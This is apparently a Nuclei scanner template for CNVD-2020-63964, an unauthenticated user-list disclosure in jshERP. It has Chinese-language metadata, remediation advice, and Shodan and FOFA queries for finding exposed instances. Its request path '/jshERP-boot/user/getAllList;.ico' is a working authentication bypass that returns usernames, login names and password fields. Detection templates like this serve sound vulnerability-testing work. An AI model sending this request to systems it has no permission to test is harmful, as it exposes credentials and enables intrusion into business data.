id: CNVD-2020-63964

info:
  name: jshERP 信息泄露漏洞（CNVD-2020-63964）
  author: brucelsone
  severity: high
  description: |
    jshERP 的用户列表接口可在异常路径下被未授权访问，导致账号信息泄露。模板请求 `/jshERP-boot/user/getAllList;.ico`，通过 JSON 响应中的用户名、登录名和密码字段确认漏洞。
  impact: |
    - 攻击者可获取系统用户账号、登录名及密码字段，辅助撞库、离线破解或直接登录后台。
    - ERP 系统中的库存、财务、采购和销售数据可能因此暴露或被篡改。
  remediation: |
    - 升级 jshERP 至修复版本，确保用户列表接口必须经过有效认证和权限校验。
    - 禁止通过路径分号、伪静态后缀等方式绕过鉴权过滤器。
    - 轮换已暴露账号密码，并检查后台登录日志和业务数据变更记录。
  reference:
    - https://cn-sec.com/archives/1798444.html
  classification:
    cpe: cpe:2.3:a:jishenghua:jsherp:*:*:*:*:*:*:*:*
  metadata:
    max-request: 1
    vendor: jishenghua
    product: jsherp
    shodan-query: http.favicon.hash:-1298131932
    fofa-query: jshERP-boot
  tags: cnvd,cnvd2020,jsherp,disclosure,vuln

http:
  - method: GET
    path:
      - "{{BaseURL}}/jshERP-boot/user/getAllList;.ico"

    matchers-condition: and
    matchers:
      - type: word
        words:
          - '"username":'
          - '"loginName":'
          - '"password":'
        condition: and

      - type: word
        part: header
        words:
          - "application/json"

      - type: status
        status:
          - 200
